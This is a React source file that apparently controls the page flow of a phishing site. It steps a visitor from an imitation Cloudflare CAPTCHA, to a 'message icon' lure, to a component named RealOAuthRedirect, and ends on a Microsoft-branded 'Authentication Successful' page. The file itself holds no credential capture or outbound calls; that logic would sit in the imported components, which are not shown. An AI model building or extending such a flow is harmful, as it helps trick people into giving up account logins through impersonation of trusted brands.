import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // Check URL parameters only once on initial load
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    
    // Only set initial state if there's a step parameter
    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success'].includes(step)) {
      setCurrentPage(step);
      // Clean the URL after reading the parameter
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []); // Empty dependency array - only run once

  // Handle the complete flow - starts with CAPTCHA
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to message icon landing');
    setCurrentPage('message-icon');
  };

  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to OAuth redirect');
    setCurrentPage('oauth-redirect');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  const handleOAuthSuccess = (sessionData: any) => {
    console.log('🔐 OAuth successful:', sessionData);
    // After successful OAuth, show success message or redirect
    setCurrentPage('success');
  };

  const handleOAuthBack = () => {
    console.log('⬅️ Back to message icon from OAuth');
    setCurrentPage('message-icon');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );

    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
      return (
        <div style={{ 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center', 
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{ 
            textAlign: 'center',
            background: 'white',
            padding: '40px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <h2>🎉 Authentication Successful!</h2>
            <p>You have been successfully authenticated with Microsoft.</p>
            <button 
              onClick={() => setCurrentPage('captcha')}
              style={{
                padding: '10px 20px',
                backgroundColor: '#0078d4',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                cursor: 'pointer',
                marginRight: '10px'
              }}
            >
              Start Over
            </button>
            <button 
              onClick={() => setCurrentPage('oauth-redirect')}
              style={{
                padding: '10px 20px',
                backgroundColor: '#107c10',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                cursor: 'pointer'
              }}
            >
              Try Again
            </button>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;